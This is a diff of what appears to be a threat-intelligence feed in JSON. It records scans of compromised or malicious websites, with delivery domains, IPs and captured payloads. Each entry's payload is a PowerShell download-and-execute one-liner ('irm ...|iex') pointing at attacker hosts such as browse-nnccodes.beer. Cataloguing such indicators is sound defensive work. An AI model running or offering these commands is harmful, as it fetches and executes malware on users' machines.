@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "www.gsrunners.it",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/8pchkbdes5/167d3c85ee383e0e"
+    ],
+    "IP": [
+      "31.11.36.33"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/8pchkbdes5/167d3c85ee383e0e"
+    ],
+    "ReportId": "cmwjyukd3198l0omlbovyvnwg",
+    "ScannedAt": "2026-11-17T00:40:35.020000+00:00"
+  },
+  {
     "UrlDomain": "specialgf4u.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -8958,119 +8977,5 @@
     ],
     "ReportId": "cmwbejue2065s0nmlscnp3a86",
     "ScannedAt": "2026-11-11T00:50:13.046000+00:00"
-  },
-  {
-    "UrlDomain": "personalgym.in",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "92.249.46.6"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/189b1694d7e41576",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905947",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/189b1694d7e41576'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/189b1694d7e41576"
-    ],
-    "ReportId": "cmwbdvg6l060a0nmlbwktk2x9",
-    "ScannedAt": "2026-11-11T00:31:14.887000+00:00"
-  },
-  {
-    "UrlDomain": "flouz.agency",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer",
-      "lovezramexar.info"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "217.160.0.123"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/cd7f076054b8a4ce",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://hollow-forge-rook-guiyn.life/t.js?site=c2b8439aa15be76cf68fb2ab1bbe9d3c",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905934",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/cd7f076054b8a4ce'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/cd7f076054b8a4ce"
-    ],
-    "ReportId": "cmwbdbmzm05o30nmlvn4xeoc2",
-    "ScannedAt": "2026-11-11T00:15:50.614000+00:00"
-  },
-  {
-    "UrlDomain": "www.ilmelograno.app",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "89.46.110.76"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/3f8a349007b400af",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905927",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/3f8a349007b400af'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/3f8a349007b400af"
-    ],
-    "ReportId": "cmwbd1grm05iz0nmlids065kj",
-    "ScannedAt": "2026-11-11T00:07:55.989000+00:00"
-  },
-  {
-    "UrlDomain": "www.njrka.lt",
-    "DeliveryUrl": [
-      "makeverizyjar.info",
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "79.98.28.30"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/44f5c1c159276caa",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://makeverizyjar.info/api.php?s=f61eff363d1bbd3db61fbed8769236f8e2a9a4474ca5bda7",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29905926",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/44f5c1c159276caa'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/44f5c1c159276caa"
-    ],
-    "ReportId": "cmwbd0qn205i20nmle2htabf0",
-    "ScannedAt": "2026-11-11T00:07:22.150000+00:00"
   }
 ]
